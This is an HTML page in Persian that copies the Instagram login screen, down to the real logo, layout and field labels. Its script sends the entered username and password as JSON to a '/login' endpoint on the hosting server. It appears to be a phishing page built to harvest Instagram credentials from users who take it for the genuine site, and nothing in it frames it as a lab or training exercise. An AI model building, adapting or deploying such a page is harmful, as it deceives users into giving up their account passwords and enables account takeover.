<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود به اینستاگرام</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            border: 1px solid #e6e6e6;
            padding: 20px 40px;
            text-align: center;
            max-width: 350px;
            width: 100%;
        }

        .logo {
            width: 175px;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 10px;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #e6e6e6;
            border-radius: 3px;
            font-size: 14px;
            background-color: #fafafa;
        }

        .input-group input:focus {
            outline: none;
            border-color: #999;
        }

        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-button:hover {
            background-color: #0077c2;
        }

        .separator {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            margin: 20px 0;
        }

        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e6e6e6;
        }

        .separator::before {
            margin-right: 10px;
        }

        .separator::after {
            margin-left: 10px;
        }

        .links {
            font-size: 14px;
            color: #00376b;
            margin-top: 20px;
        }

        .links a {
            color: #00376b;
            text-decoration: none;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="شماره موبایل، نام کاربری یا ایمیل" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="رمز عبور" required>
            </div>
            <button type="submit" class="login-button">ورود</button>
        </form>
        <div class="separator">یا</div>
        <div class="links">
            <a href="#">فراموشی رمز عبور؟</a>
        </div>
    </div>
    <div class="container">
        <div class="footer">
            حساب کاربری ندارید؟ <a href="#">ثبت‌نام کنید</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // جلوگیری از ارسال فرم

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password }),
                });

                const result = await response.json();
                alert(result.message); // نمایش پیام سرور
            } catch (error) {
                console.error('خطا:', error);
                alert('خطا در ارسال داده‌ها!');
            }
        });
    </script>
</body>
</html>
